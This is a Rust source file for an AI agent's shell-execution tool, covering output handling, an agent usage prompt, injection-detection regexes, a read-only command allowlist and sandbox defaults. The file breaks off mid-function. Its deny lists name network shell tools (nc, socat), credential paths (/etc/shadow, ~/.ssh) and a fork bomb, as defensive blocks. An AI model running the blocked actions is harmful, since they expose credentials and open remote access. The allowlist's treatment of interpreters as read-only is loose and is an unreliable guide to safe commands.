use std::collections::HashMap;

use async_trait::async_trait;
use fastclaw_core::tool::{Tool, ToolKind, ToolParameterSchema, ToolProgressUpdate, ToolResult, ProgressSender};

/// Default output truncation limit (raised from 8KB to 64KB to capture more useful output).
const DEFAULT_MAX_OUTPUT_BYTES: usize = 65536;

/// Threshold: if combined stdout+stderr exceeds this, write to a terminal file
/// and return a compact summary instead of full output in context.
const TERMINAL_FILE_THRESHOLD: usize = 800;

/// Truncate output string at a char boundary, adding a note about total size.
fn truncate_output(s: &str, max_bytes: usize) -> String {
    if s.len() <= max_bytes {
        return s.to_string();
    }
    let end = s
        .char_indices()
        .map(|(i, _)| i)
        .take_while(|&i| i <= max_bytes)
        .last()
        .unwrap_or(0);
    format!("{}... [truncated, {} bytes total]", &s[..end], s.len())
}

/// Write shell output to a persistent terminal file and return a compact
/// summary for the LLM context. The full output is retrievable via
/// `read_file` or `grep` on the returned path.
///
/// Inspired by Cursor's approach: long shell output is written to files,
/// keeping context lean while the agent can search/tail for details.
fn write_terminal_file(command: &str, stdout: &str, stderr: &str, exit_code: i32) -> Option<String> {
    let dir = std::env::temp_dir().join("fastclaw_terminals");
    if std::fs::create_dir_all(&dir).is_err() {
        return None;
    }
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let filename = format!("shell_{ts}.txt");
    let path = dir.join(&filename);

    let mut content = String::new();
    content.push_str(&format!("--- command: {} ---\n", command));
    content.push_str(&format!("--- exit_code: {} ---\n", exit_code));
    content.push_str(&format!("--- stdout ({} lines, {} bytes) ---\n", stdout.lines().count(), stdout.len()));
    content.push_str(stdout);
    if !stdout.ends_with('\n') && !stdout.is_empty() {
        content.push('\n');
    }
    if !stderr.is_empty() {
        content.push_str(&format!("--- stderr ({} lines, {} bytes) ---\n", stderr.lines().count(), stderr.len()));
        content.push_str(stderr);
        if !stderr.ends_with('\n') {
            content.push('\n');
        }
    }

    match std::fs::write(&path, &content) {
        Ok(()) => Some(path.to_string_lossy().to_string()),
        Err(_) => None,
    }
}

/// Build a compact LLM-friendly summary of shell output, referencing a file
/// for the full content. Keeps only the last few lines (tail) which typically
/// contain the final status, errors, or results.
fn compact_shell_summary(stdout: &str, stderr: &str, exit_code: i32, file_path: &str) -> String {
    let stdout_lines: Vec<&str> = stdout.lines().collect();
    let stderr_lines: Vec<&str> = stderr.lines().collect();
    let total_lines = stdout_lines.len() + stderr_lines.len();
    let total_bytes = stdout.len() + stderr.len();

    let mut summary = String::new();
    summary.push_str(&format!("exit_code={exit_code}, {total_lines} lines, {total_bytes} bytes\n"));

    let tail_count = 15;
    if !stderr.is_empty() && exit_code != 0 {
        let tail: Vec<&str> = stderr_lines.iter().rev().take(tail_count).rev().copied().collect();
        summary.push_str("stderr (last lines):\n");
        for line in tail {
            summary.push_str(line);
            summary.push('\n');
        }
    }
    if !stdout.is_empty() {
        let tail: Vec<&str> = stdout_lines.iter().rev().take(tail_count).rev().copied().collect();
        summary.push_str("stdout (last lines):\n");
        for line in tail {
            summary.push_str(line);
            summary.push('\n');
        }
    }

    summary.push_str(&format!(
        "\n[Full output saved to: {file_path} — use read_file or grep to inspect]"
    ));
    summary
}

/// Process shell output: if large, write to file and return compact summary;
/// otherwise return the full output inline.
fn process_shell_output(command: &str, stdout: &str, stderr: &str, exit_code: i32) -> (String, Option<String>) {
    let combined_size = stdout.len() + stderr.len();

    if combined_size <= TERMINAL_FILE_THRESHOLD {
        let inline = serde_json::json!({
            "exit_code": exit_code,
            "stdout": stdout,
            "stderr": stderr,
        });
        return (inline.to_string(), None);
    }

    let file_path = write_terminal_file(command, stdout, stderr, exit_code);
    match file_path {
        Some(ref path) => {
            let summary = compact_shell_summary(stdout, stderr, exit_code, path);
            (summary, file_path)
        }
        None => {
            let truncated_stdout = truncate_output(stdout, DEFAULT_MAX_OUTPUT_BYTES);
            let truncated_stderr = truncate_output(stderr, DEFAULT_MAX_OUTPUT_BYTES);
            let inline = serde_json::json!({
                "exit_code": exit_code,
                "stdout": truncated_stdout,
                "stderr": truncated_stderr,
            });
            (inline.to_string(), None)
        }
    }
}

/// Detect the preferred shell on Unix (bash if available, else sh).
#[cfg(not(windows))]
fn preferred_shell() -> &'static str {
    use std::sync::OnceLock;
    static SHELL: OnceLock<&str> = OnceLock::new();
    SHELL.get_or_init(|| {
        if std::path::Path::new("/bin/bash").exists()
            || std::path::Path::new("/usr/bin/bash").exists()
        {
            "bash"
        } else {
            "sh"
        }
    })
}

/// Detect whether PowerShell Core (`pwsh`) is available; fall back to `powershell`.
#[cfg(windows)]
fn powershell_exe() -> &'static str {
    use std::sync::OnceLock;
    static PS: OnceLock<&str> = OnceLock::new();
    *PS.get_or_init(|| {
        if std::process::Command::new("pwsh")
            .arg("--version")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .is_ok()
        {
            "pwsh"
        } else {
            "powershell"
        }
    })
}

/// Build a `tokio::process::Command` for the given shell and command string.
/// `shell_hint` is the optional "shell" parameter from tool arguments.
fn build_shell_command(command: &str, shell_hint: Option<&str>) -> tokio::process::Command {
    #[cfg(windows)]
    {
        match shell_hint {
            Some("powershell") | Some("pwsh") => {
                let exe = powershell_exe();
                let mut c = tokio::process::Command::new(exe);
                c.args(["-NoProfile", "-NonInteractive", "-Command", command]);
                c.creation_flags(0x08000000); // CREATE_NO_WINDOW
                c
            }
            _ => {
                let mut c = tokio::process::Command::new("cmd.exe");
                c.args(["/C", command]);
                c.creation_flags(0x08000000);
                c
            }
        }
    }
    #[cfg(not(windows))]
    {
        let shell = match shell_hint {
            Some("sh") => "sh",
            Some("bash") => "bash",
            _ => preferred_shell(),
        };
        let mut c = tokio::process::Command::new(shell);
        c.arg("-c").arg(command);
        c
    }
}

/// Build common shell parameter schema.
fn shell_parameter_schema(include_is_background: bool) -> ToolParameterSchema {
    let mut props = HashMap::new();
    props.insert(
        "command".to_string(),
        serde_json::json!({
            "type": "string",
            "description": "The shell command to execute."
        }),
    );
    props.insert(
        "description".to_string(),
        serde_json::json!({
            "type": "string",
            "description": "Optional brief description of the command's purpose, shown to the user."
        }),
    );
    props.insert(
        "working_dir".to_string(),
        serde_json::json!({
            "type": "string",
            "description": "Optional working directory (relative to project root or absolute). Must exist."
        }),
    );
    props.insert(
        "shell".to_string(),
        serde_json::json!({
            "type": "string",
            "enum": ["bash", "sh", "cmd", "powershell"],
            "description": "Shell to use. On Windows: 'cmd' (default) or 'powershell'. \
             On Unix: 'bash' (default) or 'sh'. Omit to use the platform default."
        }),
    );
    if include_is_background {
        props.insert(
            "is_background".to_string(),
            serde_json::json!({
                "type": "boolean",
                "description": "Whether to run the command in background. Required. \
                 Set true for long-running processes (dev servers, watchers, daemons). \
                 Set false for one-time commands that should complete before proceeding."
            }),
        );
    }
    let mut required = vec!["command".to_string()];
    if include_is_background {
        required.push("is_background".to_string());
    }
    ToolParameterSchema {
        schema_type: "object".to_string(),
        properties: props,
        required,
    }
}

/// Execute a shell command and return stdout/stderr.
pub struct ShellTool {
    timeout_secs: u64,
}

impl ShellTool {
    pub fn new(timeout_secs: u64) -> Self {
        Self { timeout_secs }
    }
}

const SHELL_TOOL_PROMPT: &str = "\
Run a shell command in the user's environment.

## When to Use

Use this tool ONLY when no specialized tool can accomplish the task:
- Reading files → use `read_file` instead of `cat`
- Editing files → use `edit_file` instead of `sed`/`awk`
- Searching file contents → use `search_in_files` instead of `grep`/`rg`
- Finding files by name → use `glob` instead of `find`
- Listing directories → use `list_directory` instead of `ls`
- Writing files → use `write_file` instead of `echo >` or `cat <<EOF`

Specialized tools are faster, produce structured output, and avoid shell escaping pitfalls.

## Command Execution Rules

### Multiple Commands

Chain dependent commands with `&&`:
```
cd /path && cargo build && cargo test
```
Use `;` only when you don't care if earlier commands fail.

For INDEPENDENT commands that can run in parallel, make separate tool calls \
in the same response — don't chain them with `&&`.

### Quoting and Paths

ALWAYS double-quote file paths that may contain spaces:
```
cat \"/path/with spaces/file.txt\"    # correct
cat /path/with spaces/file.txt        # WRONG — will fail
```

### Working Directory

Use the `working_directory` parameter to run in a specific directory rather than `cd`:
```json
{\"command\": \"npm install\", \"working_directory\": \"/path/to/project\"}
```

## Git Operations

### Commit Rules
- NEVER update the git config
- NEVER use `--no-verify` or `--no-gpg-sign` unless explicitly asked
- NEVER run `git push --force` to main/master — warn the user
- NEVER run destructive git operations (hard reset, force push) without confirmation
- Prefer creating a NEW commit over `--amend` unless all conditions are met:
  1. User explicitly requested amend, OR pre-commit hook auto-modified files
  2. HEAD commit was created by you in this conversation
  3. Commit has NOT been pushed to remote
- For commit messages, use a HEREDOC to preserve formatting:
  ```
  git commit -m \"$(cat <<'EOF'
  feat: add user authentication

  Implements JWT-based auth with refresh tokens.
  EOF
  )\"
  ```

### Branch Safety
- NEVER skip pre-commit hooks
- Check `git status` before committing
- Use `git diff` to review changes before commit

## Background Commands

Set `is_background: true` for:
- Dev servers (`npm run dev`, `cargo watch`)
- File watchers
- Any long-running process you don't need to wait for

Set `is_background: false` (default) for:
- Build commands
- Test suites
- One-off scripts
- Commands where you need the output

Timeout for foreground commands: 5 minutes. For longer tasks, use background mode \
with output redirection, then poll results.

## Sleep and Polling

Use `sleep` in shell pipelines when appropriate:
```
sleep 30 && cat build-output.txt
```

Do NOT use sleep between separate tool calls — the system handles timing.
Do NOT spin-wait in a loop. Use background mode + periodic polling.

## Anti-Patterns

- Don't use `cat` to read files — use `read_file`
- Don't use `echo` to communicate — write your response in text
- Don't use `grep` for searching — use `search_in_files`
- Don't use `sed`/`awk` to edit files — use `edit_file`
- Don't pipe long output through `head`/`tail` — use `read_file` with offset/limit
- Don't use `find` — use `glob`
- Don't use interactive commands (`vim`, `nano`, `less`, `top`)
- Don't run commands that require user input (stdin)

## Output

- stdout/stderr truncated at ~64KB
- Non-zero exit codes are returned as tool errors
- For very large output, redirect to a file and use `read_file`";

#[async_trait]
impl Tool for ShellTool {
    fn kind(&self) -> ToolKind { ToolKind::Execute }
    fn name(&self) -> &str {
        "shell_exec"
    }

    fn description(&self) -> &str {
        "Run a shell command. Returns exit_code, stdout, stderr, and signal info. \
         Default shell: bash (Unix) or cmd.exe (Windows). \
         Use the 'shell' parameter to choose: 'bash'/'sh' on Unix, 'cmd'/'powershell' on Windows. \
         Set is_background=true for dev servers, watchers, and processes you don't need to wait for; \
         set is_background=false for commands you want to wait for (timeout: 5 minutes). \
         stdout/stderr truncated at ~64KB. Non-zero exit_code returned as tool error. \
         For very long tasks (>5min), use background mode with output redirection, \
         then poll with 'sleep N' + 'read_file' to monitor progress. \
         For moderate tasks (builds, tests) that run under 5min, foreground mode is fine — \
         use 'sleep' freely in shell pipelines (e.g. 'sleep 30 && cat result.txt')."
    }

    fn prompt(&self) -> String {
        SHELL_TOOL_PROMPT.to_string()
    }

    fn parameters_schema(&self) -> ToolParameterSchema {
        shell_parameter_schema(true)
    }

    fn supports_progress(&self) -> bool { true }

    fn max_result_size_chars(&self) -> usize { 30_000 }

    async fn execute(&self, arguments: &str) -> ToolResult {
        self.execute_shell(arguments, None).await
    }

    async fn execute_with_progress(
        &self,
        arguments: &str,
        progress: ProgressSender,
    ) -> ToolResult {
        self.execute_shell(arguments, Some(progress)).await
    }
}

impl ShellTool {
    async fn execute_shell(&self, arguments: &str, progress: Option<ProgressSender>) -> ToolResult {
        let args: serde_json::Value = match serde_json::from_str(arguments) {
            Ok(v) => v,
            Err(e) => return ToolResult::err(format!(
                "shell_exec arguments are not valid JSON: {e}. \
                 Pass {{\"command\": \"...\", \"is_background\": false}} with optional \"working_dir\", \"description\"."
            )),
        };

        let command = match args.get("command").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => return ToolResult::err(
                "shell_exec is missing string field 'command'. \
                 Example: {\"command\": \"ls -la\", \"is_background\": false}."
                    .to_string(),
            ),
        };

        let is_background = args
            .get("is_background")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        let user_confirmed = args
            .get("confirmed")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        if !user_confirmed {
            match fastclaw_security::dangerous_ops::check_dangerous_command(command) {
                Ok(()) => {}
                Err(fastclaw_security::dangerous_ops::CheckResult::Denied(msg))
                | Err(fastclaw_security::dangerous_ops::CheckResult::NeedsConfirmation(msg)) => {
                    return ToolResult::needs_confirm(format!(
                        "This command requires user confirmation: {msg}"
                    ));
                }
            }
        }

        let shell_hint = args.get("shell").and_then(|v| v.as_str());
        let mut cmd = build_shell_command(command, shell_hint);

        if let Some(dir) = args.get("working_dir").and_then(|v| v.as_str()) {
            cmd.current_dir(dir);
        }

        cmd.env("FASTCLAW_AGENT", "1");

        cmd.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());

        let timeout = tokio::time::Duration::from_secs(self.timeout_secs);

        if is_background {
            match cmd.spawn() {
                Ok(mut child) => {
                    let pid = child.id();
                    let desc = args.get("description").and_then(|v| v.as_str()).unwrap_or(command);
                    let cmd_for_log = command.to_string();
                    tokio::spawn(async move {
                        match child.wait().await {
                            Ok(status) => tracing::debug!(
                                pid, command = %cmd_for_log,
                                exit_code = status.code(),
                                "background shell command exited"
                            ),
                            Err(e) => tracing::warn!(
                                pid, command = %cmd_for_log,
                                error = %e,
                                "background shell command wait failed"
                            ),
                        }
                    });
                    ToolResult::ok(
                        serde_json::json!({
                            "background": true,
                            "pid": pid,
                            "command": command,
                            "description": desc,
                        })
                        .to_string(),
                    )
                }
                Err(e) => ToolResult::err(format!("shell_exec spawn failed: {e}")),
            }
        } else if progress.is_some() {
            self.execute_with_streaming(cmd, command, timeout, progress.unwrap()).await
        } else {
            match tokio::time::timeout(timeout, cmd.output()).await {
                Ok(Ok(output)) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let code = output.status.code().unwrap_or(-1);

                    let (llm_out, terminal_file) = process_shell_output(command, &stdout, &stderr, code);

                    let full_display = serde_json::json!({
                        "exit_code": code,
                        "stdout": truncate_output(&stdout, DEFAULT_MAX_OUTPUT_BYTES),
                        "stderr": truncate_output(&stderr, DEFAULT_MAX_OUTPUT_BYTES),
                        "terminal_file": terminal_file,
                    }).to_string();

                    if code == 0 {
                        ToolResult::ok_split(llm_out, full_display)
                    } else {
                        ToolResult::err(llm_out)
                    }
                }
                Ok(Err(e)) => ToolResult::err(format!(
                    "shell_exec spawn failed: {e}"
                )),
                Err(_) => ToolResult::err(format!(
                    "shell_exec timed out after {}s, command killed.",
                    self.timeout_secs
                )),
            }
        }
    }

    async fn execute_with_streaming(
        &self,
        mut cmd: tokio::process::Command,
        command: &str,
        timeout: tokio::time::Duration,
        progress: ProgressSender,
    ) -> ToolResult {
        use tokio::io::{AsyncBufReadExt, BufReader};

        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => return ToolResult::err(format!("shell_exec spawn failed: {e}")),
        };

        let stdout = child.stdout.take();
        let stderr = child.stderr.take();

        let progress_clone = progress.clone();
        let stdout_task = tokio::spawn(async move {
            let mut lines = Vec::new();
            if let Some(out) = stdout {
                let mut reader = BufReader::new(out).lines();
                while let Ok(Some(line)) = reader.next_line().await {
                    lines.push(line.clone());
                    let count = lines.len();
                    if count % 10 == 0 || count <= 5 {
                        let _ = progress_clone.send(ToolProgressUpdate {
                            message: format!("stdout: {} lines", count),
                            progress: None,
                            partial_output: Some(
                                lines.iter().rev().take(5).rev()
                                    .cloned().collect::<Vec<_>>().join("\n")
                            ),
                        }).await;
                    }
                }
            }
            lines.join("\n")
        });

        let stderr_task = tokio::spawn(async move {
            let mut lines = Vec::new();
            if let Some(err) = stderr {
                let mut reader = BufReader::new(err).lines();
                while let Ok(Some(line)) = reader.next_line().await {
                    lines.push(line);
                }
            }
            lines.join("\n")
        });

        let wait_result = tokio::time::timeout(timeout, async {
            let stdout_out = stdout_task.await.unwrap_or_default();
            let stderr_out = stderr_task.await.unwrap_or_default();
            let status = child.wait().await;
            (stdout_out, stderr_out, status)
        }).await;

        match wait_result {
            Ok((stdout_out, stderr_out, Ok(status))) => {
                let code = status.code().unwrap_or(-1);
                let total_lines = stdout_out.lines().count() + stderr_out.lines().count();

                let _ = progress.send(ToolProgressUpdate {
                    message: format!("completed: exit_code={code}, {total_lines} total lines"),
                    progress: Some(1.0),
                    partial_output: None,
                }).await;

                let (llm_out, terminal_file) = process_shell_output(command, &stdout_out, &stderr_out, code);

                let full_display = serde_json::json!({
                    "exit_code": code,
                    "stdout": truncate_output(&stdout_out, DEFAULT_MAX_OUTPUT_BYTES),
                    "stderr": truncate_output(&stderr_out, DEFAULT_MAX_OUTPUT_BYTES),
                    "terminal_file": terminal_file,
                }).to_string();

                if code == 0 {
                    ToolResult::ok_split(llm_out, full_display)
                } else {
                    ToolResult::err(llm_out)
                }
            }
            Ok((_, _, Err(e))) => ToolResult::err(format!("shell_exec wait failed: {e}")),
            Err(_) => {
                let _ = child.kill().await;
                ToolResult::err(format!(
                    "shell_exec timed out after {}s, command killed.",
                    self.timeout_secs
                ))
            }
        }
    }
}
// --- Shell Injection Detection ---

/// Patterns that indicate shell injection / command substitution.
/// Each entry: (regex_pattern, human description).
/// Applied to the command text after single-quoted regions are stripped.
const INJECTION_PATTERNS: &[(&str, &str)] = &[
    (r"\$\(", "$() command substitution"),
    (r"\$\{[^}]*[!:/#%]", "${} dangerous parameter expansion"),
    (r"<\(", "process substitution <()"),
    (r">\(", "process substitution >()"),
    (r"=\(", "Zsh process substitution =()"),
    (r"\$\[", "$[] legacy arithmetic expansion"),
    (r"(?:^|[\s;&|])=[a-zA-Z_]", "Zsh equals expansion (=cmd)"),
];

/// Commands considered safe (read-only) for Plan mode execution.
/// These commands only read information and do not modify state.
const READONLY_COMMANDS: &[&str] = &[
    // File inspection
    "ls", "ll", "la", "dir", "exa", "eza", "lsd",
    "cat", "bat", "head", "tail", "less", "more",
    "wc", "file", "stat", "du", "df",
    // Search
    "grep", "rg", "ag", "ack", "fgrep", "egrep",
    "find", "fd", "fdfind", "locate", "which", "whereis", "type",
    // Text processing (readonly)
    "sort", "uniq", "tr", "cut", "paste", "column",
    "awk", "sed", // Only readonly when no -i flag (checked separately)
    "diff", "comm", "cmp",
    "jq", "yq", "xq",
    // System info
    "echo", "printf", "date", "whoami", "hostname", "uname",
    "env", "printenv", "id", "groups",
    "ps", "top", "htop", "free", "uptime", "lsof",
    "pwd", "realpath", "dirname", "basename",
    // Development tools (read-only subcommands handled separately)
    "tree", "tokei", "cloc", "scc",
    "python3", "python", "node", "ruby", // Script execution for queries
    "cargo", // Subcommand checked separately
    "npm", "npx", "yarn", "pnpm", // Subcommand checked separately
    "git", // Subcommand checked separately
    "gh", // Subcommand checked separately
    "docker", // Subcommand checked separately
    "kubectl", // Subcommand checked separately
    "rustc", "gcc", "g++", "clang", // Compilation is treated as read since it doesn't modify source
    "make", // Build is read-only from source perspective
    "test", "[",
    "true", "false",
    "sleep",
    "xargs", // Only safe with readonly sub-commands (checked via pipeline)
];

/// Git subcommands that are read-only.
const GIT_READONLY_SUBCOMMANDS: &[&str] = &[
    "status", "log", "diff", "show", "branch", "tag",
    "describe", "shortlog", "blame", "ls-files", "ls-tree",
    "rev-parse", "rev-list", "remote", "config",
    "stash", // stash list/show are readonly; stash pop/apply are not but common enough
];

/// Cargo subcommands that are read-only.
const CARGO_READONLY_SUBCOMMANDS: &[&str] = &[
    "check", "clippy", "test", "bench", "doc",
    "tree", "metadata", "pkgid", "verify-project",
    "version", "help", "search",
];

/// npm/yarn/pnpm subcommands that are read-only.
const NPM_READONLY_SUBCOMMANDS: &[&str] = &[
    "list", "ls", "info", "show", "view", "outdated",
    "audit", "explain", "why", "help", "version",
    "test", "run", // run scripts are common in development
];

/// Docker subcommands that are read-only.
const DOCKER_READONLY_SUBCOMMANDS: &[&str] = &[
    "ps", "images", "inspect", "logs", "stats", "top",
    "port", "diff", "history", "version", "info",
];

/// Classify whether a single command segment is readonly.
/// Returns Ok(()) if the command is readonly, Err(reason) if it's a write/dangerous command.
fn classify_readonly(segment: &str) -> Result<(), String> {
    let trimmed = segment.trim();
    if trimmed.is_empty() {
        return Ok(());
    }

    // Output redirection → write operation
    if has_output_redirection(trimmed) {
        return Err("output redirection (> or >>) makes this a write operation".into());
    }

    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    if tokens.is_empty() {
        return Ok(());
    }

    let base_cmd = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);

    // Special handling for commands with subcommands
    if base_cmd == "git" {
        return classify_git_readonly(&tokens[1..]);
    }
    if base_cmd == "cargo" {
        return classify_subcommand_readonly(&tokens[1..], CARGO_READONLY_SUBCOMMANDS, "cargo");
    }
    if matches!(base_cmd, "npm" | "npx" | "yarn" | "pnpm") {
        return classify_subcommand_readonly(&tokens[1..], NPM_READONLY_SUBCOMMANDS, base_cmd);
    }
    if base_cmd == "docker" {
        return classify_subcommand_readonly(&tokens[1..], DOCKER_READONLY_SUBCOMMANDS, "docker");
    }

    // sed -i is a write operation
    if base_cmd == "sed" && tokens.iter().any(|t| *t == "-i" || t.starts_with("-i")) {
        return Err("sed -i modifies files in place".into());
    }

    if READONLY_COMMANDS.contains(&base_cmd) {
        return Ok(());
    }

    Err(format!("command '{base_cmd}' is not in the read-only allowlist"))
}

fn classify_git_readonly(args: &[&str]) -> Result<(), String> {
    let subcommand = args.iter()
        .find(|a| !a.starts_with('-'))
        .copied()
        .unwrap_or("");

    if subcommand.is_empty() || GIT_READONLY_SUBCOMMANDS.contains(&subcommand) {
        Ok(())
    } else {
        Err(format!("git {subcommand} is not a read-only git operation"))
    }
}

fn classify_subcommand_readonly(args: &[&str], allowed: &[&str], parent: &str) -> Result<(), String> {
    let subcommand = args.iter()
        .find(|a| !a.starts_with('-'))
        .copied()
        .unwrap_or("");

    if subcommand.is_empty() || allowed.contains(&subcommand) {
        Ok(())
    } else {
        Err(format!("{parent} {subcommand} is not a read-only operation"))
    }
}

/// Check if a command segment contains output redirection (> or >>).
/// Skips redirections inside quotes.
fn has_output_redirection(s: &str) -> bool {
    let stripped = strip_single_quoted_regions(s);
    let bytes = stripped.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    while i < len {
        if bytes[i] == b'>' {
            // Skip 2> (stderr redirect, informational)
            if i > 0 && bytes[i - 1] == b'2' {
                i += 1;
                continue;
            }
            // Skip >( (process substitution)
            let next = if bytes[i + 1..].first() == Some(&b'>') { i + 2 } else { i + 1 };
            if next < len && bytes[next] == b'(' {
                i = next + 1;
                continue;
            }
            return true;
        }
        i += 1;
    }
    false
}

/// Validate that a full command (with pipes and chains) is entirely readonly.
/// Every segment in pipes (|), AND (&&), OR (||), and semicolons (;) must be readonly.
pub fn validate_readonly_command(command: &str) -> Result<(), String> {
    // Split on pipe first, then on chain operators within each pipe segment
    for pipe_segment in command.split('|') {
        let pipe_seg = pipe_segment.trim();
        if pipe_seg.is_empty() {
            continue;
        }
        // Further split on && || ;
        for part in pipe_seg
            .split("&&")
            .flat_map(|s| s.split("||"))
            .flat_map(|s| s.split(';'))
        {
            classify_readonly(part)?;
        }
    }
    Ok(())
}

/// Zsh-specific dangerous commands that can bypass shell security.
const ZSH_DANGEROUS_COMMANDS: &[&str] = &[
    "zmodload", "emulate",
    "sysopen", "sysread", "syswrite", "sysseek",
    "zpty", "ztcp", "zsocket",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
];

/// Strip single-quoted regions from a command string.
/// Content inside single quotes is not subject to shell expansion, so
/// patterns within them are safe and should not trigger injection detection.
fn strip_single_quoted_regions(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut in_single_quote = false;

    for ch in s.chars() {
        if ch == '\'' && !in_single_quote {
            in_single_quote = true;
        } else if ch == '\'' && in_single_quote {
            in_single_quote = false;
        } else if !in_single_quote {
            result.push(ch);
        }
    }
    result
}

/// Check for unescaped backtick command substitution.
/// Returns true if the string contains backticks that are not preceded by `\`.
fn contains_unescaped_backticks(s: &str) -> bool {
    let bytes = s.as_bytes();
    for i in 0..bytes.len() {
        if bytes[i] == b'`' && (i == 0 || bytes[i - 1] != b'\\') {
            return true;
        }
    }
    false
}

// --- Sandboxed Shell Execution ---

/// Policy-driven sandbox configuration for shell command execution.
#[derive(Debug, Clone)]
pub struct ShellSandboxConfig {
    /// Maximum execution time in seconds.
    pub timeout_secs: u64,
    /// Maximum output size in bytes before truncation.
    pub max_output_bytes: usize,
    /// Commands that are always blocked (matched against the first token).
    pub denied_commands: Vec<String>,
    /// If non-empty, only these commands are allowed (whitelist mode).
    pub allowed_commands: Vec<String>,
    /// Deny patterns: each is a regex applied to the full command string.
    /// Use `\b` word boundaries to avoid false positives like `eval ` matching `evaluate`.
    pub denied_patterns: Vec<String>,
    /// Compiled deny-pattern regexes (built from `denied_patterns`).
    denied_regexes: Vec<(regex::Regex, String)>,
    /// Allowed working directories. If empty, any directory is allowed.
    pub allowed_dirs: Vec<String>,
    /// Environment variables to strip before execution.
    pub strip_env_vars: Vec<String>,
    /// Whether to enable Linux namespace isolation (requires unshare permissions).
    pub use_namespace: bool,
    /// Read-only filesystem paths (for namespace mode).
    pub readonly_paths: Vec<String>,
}

impl ShellSandboxConfig {
    fn compile_denied_regexes(patterns: &[String]) -> Vec<(regex::Regex, String)> {
        patterns
            .iter()
            .filter_map(|p| {
                regex::Regex::new(p)
                    .map(|re| (re, p.clone()))
                    .map_err(|e| {
                        tracing::warn!(
                            pattern = %p,
                            error = %e,
                            "sandbox: skipped invalid denied_pattern regex"
                        );
                    })
                    .ok()
            })
            .collect()
    }
}

fn default_denied_patterns() -> Vec<String> {
    vec![
        r"> /dev/".into(),
        r"\| /dev/".into(),
        r":\(\)\{ :\|:& \};:".into(),
        r"\beval\b".into(),
        r"/etc/shadow".into(),
        r"/etc/passwd".into(),
        r"~/\.ssh\b".into(),
        r"\.ssh/".into(),
    ]
}

impl Default for ShellSandboxConfig {
    fn default() -> Self {
        let patterns = default_denied_patterns();
        let denied_regexes = Self::compile_denied_regexes(&patterns);
        Self {
            timeout_secs: 300,
            max_output_bytes: 65536,
            denied_commands: vec![
                // rm, rmdir, chmod, chown, chgrp are handled by the dangerous_ops policy
                // (deny/confirm/allow) rather than hard-blocked here.
                "mkfs".into(),
                "dd".into(),
                "shutdown".into(),
                "reboot".into(),
                "poweroff".into(),
                "halt".into(),
                // kill/killall/pkill removed — allow process management for dev workflows
                "mount".into(),
                "umount".into(),
                "iptables".into(),
                "ip6tables".into(),
                "nft".into(),
                "useradd".into(),
                "userdel".into(),
                "usermod".into(),
                "passwd".into(),
                "su".into(),
                "sudo".into(),
                "crontab".into(),
                "nc".into(),
                "ncat".into(),
                "socat".into(),
            ],
            allowed_commands: Vec::new(),
            denied_patterns: patterns,
            denied_regexes,
            allowed_dirs: Vec::new(),
            strip_env_vars: vec![
                "AWS_SECRET_ACCESS_KEY".into(),
                "AWS_SESSION_TOKEN".into(),
                "GITHUB_TOKEN".into(),
                "GH_TOKEN".into(),
                "NPM_TOKEN".into(),
                "DATABASE_URL".into(),
                "PRIVATE_KEY".into(),
            ],
            use_namespace: false,
            readonly_paths: Vec::new(),
        }
    }
}

/// Sandboxed shell execution tool with policy enforcement.
pub struct SandboxedShellTool {
    config: ShellSandboxConfig,
}

impl SandboxedShellTool {
    pub fn new(mut config: ShellSandboxConfig) -> Self {
        if config.denied_regexes.is_empty() && !config.denied_patterns.is_empty() {
            config.denied_regexes =
                ShellSandboxConfig::compile_denied_regexes(&config.denied_patterns);
        }
        Self { config }
    }

    fn validate_command(&self, command: &str) -> Result<(), String> {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return Err(
                "Sandbox shell command is empty after trimming whitespace. \
                 Provide a non-empty sh -c snippet, e.g. {\"command\": \"echo ok\"}."
                    .into(),
            );
        }

        self.validate_injection_patterns(trimmed)?;

        let first_token = trimmed.split_whitespace().next().unwrap_or("");
        let base_cmd = first_token.rsplit('/').next().unwrap_or(first_token);

        if !self.config.allowed_commands.is_empty()
            && !self.config.allowed_commands.iter().any(|c| c == base_cmd) {
                return Err(format!(
                    "Sandbox allowlist rejects first command '{base_cmd}'. \
                     Allowed base commands: {}. \
                     Rewrite the pipeline using only those binaries, or ask the operator to widen allowed_commands.",
                    self.config.allowed_commands.join(", ")
                ));
            }

        if self.config.denied_commands.iter().any(|c| c == base_cmd) {
            return Err(format!(
                "Sandbox policy blocks base command '{base_cmd}' (classified as high-risk). \
                 Use read_file/write_file/list_directory or narrower tools instead of shell for that action, or ask the operator to change denied_commands if this block is a false positive."
            ));
        }

        for (re, pattern) in &self.config.denied_regexes {
            if re.is_match(trimmed) {
                return Err(format!(
                    "Sandbox denied_pattern matched regex '{pattern}' in the command text. \
                     Remove that construct (often sensitive paths or shell tricks) and use approved tools; if this is a false positive, ask the operator to tune denied_patterns."
                ));
            }
        }

        for part in trimmed
            .split("&&")
            .chain(trimmed.split("||"))
            .chain(trimmed.split(';'))
        {
            let sub = part.trim();
            let sub_cmd = sub.split_whitespace().next().unwrap_or("");
            let sub_base = sub_cmd.rsplit('/').next().unwrap_or(sub_cmd);
            if sub_base.is_empty() {
                continue;
            }
            if self.config.denied_commands.iter().any(|c| c == sub_base) {
                return Err(format!(
                    "Sandbox detected blocked base command '{sub_base}' inside a chained segment (split on &&, ||, or ;). \
                     Every segment must pass the same allow/deny rules—remove or replace the risky segment, or split into separate shell_exec calls."
                ));
            }
            let sub_base_for_zsh = sub.split_whitespace().next().unwrap_or("");
            let sub_base_zsh = sub_base_for_zsh.rsplit('/').next().unwrap_or(sub_base_for_zsh);
